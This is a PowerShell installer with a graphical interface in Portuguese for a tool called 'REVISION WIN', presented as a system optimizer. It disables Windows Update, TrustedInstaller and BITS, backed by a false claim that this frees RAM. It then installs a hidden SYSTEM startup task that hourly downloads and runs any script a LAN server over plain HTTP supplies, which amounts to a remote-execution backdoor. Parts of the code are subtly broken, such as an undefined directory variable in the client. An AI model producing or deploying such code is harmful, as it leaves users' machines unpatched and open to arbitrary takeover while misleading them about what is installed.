<#
╔══════════════════════════════════════════════════════════════════════════════╗
║                         REVISION WIN - INSTALADOR GUI                         ║
║                     Interface gráfica profissional                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
#>

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

# Estilos e cores
$Global:RevisionColors = @{
    Primary = [System.Drawing.Color]::FromArgb(0, 120, 215)
    Dark = [System.Drawing.Color]::FromArgb(30, 30, 35)
    Danger = [System.Drawing.Color]::FromArgb(220, 53, 69)
    Success = [System.Drawing.Color]::FromArgb(40, 167, 69)
    Warning = [System.Drawing.Color]::FromArgb(255, 193, 7)
    Info = [System.Drawing.Color]::FromArgb(23, 162, 184)
    Background = [System.Drawing.Color]::FromArgb(20, 20, 25)
    Text = [System.Drawing.Color]::White
}

# Função para descobrir servidor automaticamente
function Find-RevisionServer {
    try {
        # Tenta encontrar via broadcast/mDNS
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
        $subnet = $localIP.Substring(0, $localIP.LastIndexOf('.'))
        
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "REVISION WIN - Procurando Servidor"
        $form.Size = New-Object System.Drawing.Size(400, 150)
        $form.StartPosition = "CenterScreen"
        $form.BackColor = $RevisionColors.Background
        $form.FormBorderStyle = "FixedDialog"
        $form.ControlBox = $false
        
        $label = New-Object System.Windows.Forms.Label
        $label.Text = "🔍 Procurando servidor REVISION WIN na rede..."
        $label.Location = New-Object System.Drawing.Point(50, 30)
        $label.Size = New-Object System.Drawing.Size(300, 30)
        $label.ForeColor = $RevisionColors.Text
        $label.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
        $label.TextAlign = "MiddleCenter"
        
        $progressBar = New-Object System.Windows.Forms.ProgressBar
        $progressBar.Location = New-Object System.Drawing.Point(50, 80)
        $progressBar.Size = New-Object System.Drawing.Size(300, 20)
        $progressBar.Style = "Marquee"
        $progressBar.MarqueeAnimationSpeed = 10
        
        $form.Controls.Add($label)
        $form.Controls.Add($progressBar)
        $form.Show()
        $form.Refresh()
        
        $serverIP = $null
        for ($i = 1; $i -le 254; $i++) {
            $testIP = "$subnet.$i"
            $ping = Test-Connection -ComputerName $testIP -Count 1 -Quiet -ErrorAction SilentlyContinue
            if ($ping) {
                try {
                    $config = Invoke-RestMethod -Uri "http://$testIP`:8080/config" -TimeoutSec 1 -ErrorAction SilentlyContinue
                    if ($config.server_name -eq "REVISION WIN") {
                        $serverIP = $testIP
                        break
                    }
                } catch {}
            }
            $progressBar.Value = ($i / 254) * 100
        }
        
        $form.Close()
        return $serverIP
    } catch {
        return $null
    }
}

# Janela Principal de Instalação
function Show-InstallWindow {
    param([string]$AutoServerIP = $null)
    
    # Form principal
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "REVISION WIN - Instalação"
    $form.Size = New-Object System.Drawing.Size(800, 600)
    $form.StartPosition = "CenterScreen"
    $form.BackColor = $RevisionColors.Background
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("powershell.exe")
    
    # Logo/Header
    $headerPanel = New-Object System.Windows.Forms.Panel
    $headerPanel.Size = New-Object System.Drawing.Size(800, 120)
    $headerPanel.Location = New-Object System.Drawing.Point(0, 0)
    $headerPanel.BackColor = $RevisionColors.Primary
    
    $logoLabel = New-Object System.Windows.Forms.Label
    $logoLabel.Text = @"
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║   ██████╗ ███████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗     ║
║   ██╔══██╗██╔════╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║     ║
║   ██████╔╝█████╗  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║     ║
║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║     ║
║   ██║  ██║███████╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║     ║
║   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ║
║                                                                    ║
║                       REVISION WIN INSTALLER                       ║
╚════════════════════════════════════════════════════════════════════╝
"@
    $logoLabel.Location = New-Object System.Drawing.Point(0, 10)
    $logoLabel.Size = New-Object System.Drawing.Size(800, 100)
    $logoLabel.ForeColor = [System.Drawing.Color]::White
    $logoLabel.Font = New-Object System.Drawing.Font("Consolas", 8, [System.Drawing.FontStyle]::Bold)
    $logoLabel.TextAlign = "MiddleCenter"
    $headerPanel.Controls.Add($logoLabel)
    
    # Painel de conteúdo
    $contentPanel = New-Object System.Windows.Forms.Panel
    $contentPanel.Location = New-Object System.Drawing.Point(20, 140)
    $contentPanel.Size = New-Object System.Drawing.Size(760, 380)
    $contentPanel.BackColor = $RevisionColors.Background
    
    # Status do servidor
    $serverGroup = New-Object System.Windows.Forms.GroupBox
    $serverGroup.Text = " Conexão com o Servidor "
    $serverGroup.Location = New-Object System.Drawing.Point(10, 10)
    $serverGroup.Size = New-Object System.Drawing.Size(740, 100)
    $serverGroup.ForeColor = $RevisionColors.Text
    $serverGroup.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    
    $serverStatusLabel = New-Object System.Windows.Forms.Label
    $serverStatusLabel.Location = New-Object System.Drawing.Point(20, 30)
    $serverStatusLabel.Size = New-Object System.Drawing.Size(700, 25)
    $serverStatusLabel.ForeColor = $RevisionColors.Warning
    $serverStatusLabel.Text = "🔍 Procurando servidor automaticamente..."
    
    $serverIPBox = New-Object System.Windows.Forms.TextBox
    $serverIPBox.Location = New-Object System.Drawing.Point(20, 60)
    $serverIPBox.Size = New-Object System.Drawing.Size(300, 25)
    $serverIPBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
    $serverIPBox.ForeColor = $RevisionColors.Text
    $serverIPBox.Font = New-Object System.Drawing.Font("Segoe UI", 10)
    $serverIPBox.Text = "Clique em 'Buscar' para encontrar o servidor"
    
    $searchButton = New-Object System.Windows.Forms.Button
    $searchButton.Location = New-Object System.Drawing.Point(330, 58)
    $searchButton.Size = New-Object System.Drawing.Size(100, 30)
    $searchButton.Text = "🔍 Buscar"
    $searchButton.BackColor = $RevisionColors.Info
    $searchButton.ForeColor = [System.Drawing.Color]::White
    $searchButton.FlatStyle = "Flat"
    $searchButton.Add_Click({
        $serverStatusLabel.Text = "🔍 Procurando servidor na rede..."
        $serverStatusLabel.ForeColor = $RevisionColors.Warning
        $form.Refresh()
        
        $foundIP = Find-RevisionServer
        if ($foundIP) {
            $serverIPBox.Text = $foundIP
            $serverStatusLabel.Text = "✅ Servidor encontrado! IP: $foundIP"
            $serverStatusLabel.ForeColor = $RevisionColors.Success
        } else {
            $serverStatusLabel.Text = "❌ Servidor não encontrado. Verifique se o servidor está rodando."
            $serverStatusLabel.ForeColor = $RevisionColors.Danger
        }
    })
    
    $serverGroup.Controls.Add($serverStatusLabel)
    $serverGroup.Controls.Add($serverIPBox)
    $serverGroup.Controls.Add($searchButton)
    
    # Painel de funcionalidades
    $featuresGroup = New-Object System.Windows.Forms.GroupBox
    $featuresGroup.Text = " O que será instalado "
    $featuresGroup.Location = New-Object System.Drawing.Point(10, 120)
    $featuresGroup.Size = New-Object System.Drawing.Size(740, 120)
    $featuresGroup.ForeColor = $RevisionColors.Text
    $featuresGroup.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
    
    $features = @(
        "✅ Desativação do Windows Update (libera 2-4GB de RAM)",
        "✅ Remoção de serviços de telemetria da Microsoft",
        "✅ Instalação do cliente REVISION WIN",
        "✅ Configuração de atualizações automáticas via seu servidor",
        "✅ Customização completa do sistema"
    )
    
    $yPos = 30
    foreach ($feature in $features) {
        $checkBox = New-Object System.Windows.Forms.CheckBox
        $checkBox.Text = $feature
        $checkBox.Location = New-Object System.Drawing.Point(20, $yPos)
        $checkBox.Size = New-Object System.Drawing.Size(700, 25)
        $checkBox.ForeColor = $RevisionColors.Text
        $checkBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $checkBox.Checked = $true
        $checkBox.Enabled = $false
        $featuresGroup.Controls.Add($checkBox)
        $yPos += 25
    }
    
    # Barra de progresso
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Location = New-Object System.Drawing.Point(10, 250)
    $progressBar.Size = New-Object System.Drawing.Size(740, 30)
    $progressBar.Style = "Continuous"
    
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Location = New-Object System.Drawing.Point(10, 290)
    $statusLabel.Size = New-Object System.Drawing.Size(740, 40)
    $statusLabel.ForeColor = $RevisionColors.Text
    $statusLabel.Text = "Pronto para instalar"
    $statusLabel.TextAlign = "MiddleCenter"
    
    # Botões
    $installButton = New-Object System.Windows.Forms.Button
    $installButton.Text = "🚀 INSTALAR REVISION WIN"
    $installButton.Location = New-Object System.Drawing.Point(200, 340)
    $installButton.Size = New-Object System.Drawing.Size(340, 50)
    $installButton.BackColor = $RevisionColors.Success
    $installButton.ForeColor = [System.Drawing.Color]::White
    $installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
    $installButton.FlatStyle = "Flat"
    
    $installButton.Add_Click({
        $serverIP = $serverIPBox.Text
        if ($serverIP -eq "" -or $serverIP -eq "Clique em 'Buscar' para encontrar o servidor") {
            [System.Windows.Forms.MessageBox]::Show("Por favor, busque um servidor primeiro!", "Erro", "OK", "Error")
            return
        }
        
        $installButton.Enabled = $false
        $searchButton.Enabled = $false
        
        # Inicia instalação em background
        $installJob = Start-Job -ScriptBlock {
            param($ip)
            
            function Write-Log { param($m) Write-Host $m }
            
            # Configurações
            $ScriptDir = "C:\RevisionWin"
            $ServerURL = "http://${ip}:8080"
            $ClientID = $env:COMPUTERNAME
            
            New-Item -ItemType Directory -Force -Path $ScriptDir, "$ScriptDir\temp" | Out-Null
            
            # Desativa Windows Update
            $services = @("wuauserv", "TrustedInstaller", "dosvc", "diagtrack", "dmwappushservice", "BITS")
            foreach ($svc in $services) {
                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            }
            
            # Remove telemetria
            Get-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience\" -ErrorAction SilentlyContinue | Disable-ScheduledTask -ErrorAction SilentlyContinue
            
            # Cria cliente
            $clientScript = @"
# REVISION WIN CLIENT
`$ServerURL = "$ServerURL"
`$ClientID = "$ClientID"

while (`$true) {
    try {
        `$updates = Invoke-RestMethod -Uri "`$ServerURL/check?client_id=`$ClientID" -Method Get -ErrorAction SilentlyContinue
        foreach (`$update in `$updates) {
            `$scriptPath = "`$ScriptDir\temp\`$(`$update.script)"
            Invoke-WebRequest -Uri "`$ServerURL/download?script=`$(`$update.script)" -OutFile `$scriptPath
            & `$scriptPath
        }
    } catch {}
    Start-Sleep -Seconds 3600
}
"@
            $clientScript | Out-File -FilePath "$ScriptDir\RevisionWin_Client.ps1" -Encoding UTF8
            
            # Cria tarefa agendada
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptDir\RevisionWin_Client.ps1`" -WindowStyle Hidden"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName "RevisionWinClient" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
            
            # Registra no servidor
            $osVersion = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
            $ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0)
            $body = @{client_id=$ClientID; hostname=$env:COMPUTERNAME; ip="unknown"; os_version=$osVersion; ram_gb=$ramGB} | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerURL/register" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
            
            return "SUCCESS"
        }
        
        $result = Receive-Job -Job $installJob -Wait
        Remove-Job -Job $installJob
        
        if ($result -eq "SUCCESS") {
            [System.Windows.Forms.MessageBox]::Show("✅ REVISION WIN instalado com sucesso!`n`nO Windows Update foi desativado.`nA Microsoft perdeu o controle.", "Sucesso", "OK", "Information")
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("❌ Erro na instalação. Tente novamente.", "Erro", "OK", "Error")
            $installButton.Enabled = $true
            $searchButton.Enabled = $true
        }
    })
    
    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Text = "Cancelar"
    $cancelButton.Location = New-Object System.Drawing.Point(560, 340)
    $cancelButton.Size = New-Object System.Drawing.Size(150, 50)
    $cancelButton.BackColor = $RevisionColors.Danger
    $cancelButton.ForeColor = [System.Drawing.Color]::White
    $cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $cancelButton.FlatStyle = "Flat"
    $cancelButton.Add_Click({ $form.Close() })
    
    $contentPanel.Controls.Add($serverGroup)
    $contentPanel.Controls.Add($featuresGroup)
    $contentPanel.Controls.Add($progressBar)
    $contentPanel.Controls.Add($statusLabel)
    $contentPanel.Controls.Add($installButton)
    $contentPanel.Controls.Add($cancelButton)
    
    $form.Controls.Add($headerPanel)
    $form.Controls.Add($contentPanel)
    
    # Auto-busca ao abrir
    if ($AutoServerIP) {
        $serverIPBox.Text = $AutoServerIP
        $serverStatusLabel.Text = "✅ Servidor encontrado! IP: $AutoServerIP"
        $serverStatusLabel.ForeColor = $RevisionColors.Success
    } else {
        $searchButton.PerformClick()
    }
    
    $form.ShowDialog() | Out-Null
}

# Script principal
function Main {
    # Verifica se é admin
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        [System.Windows.Forms.MessageBox]::Show("REVISION WIN precisa ser executado como Administrador!`n`nClique com botão direito > Executar como administrador", "Permissão Necessária", "OK", "Error")
        exit 1
    }
    
    Show-InstallWindow
}

# Executar
Main
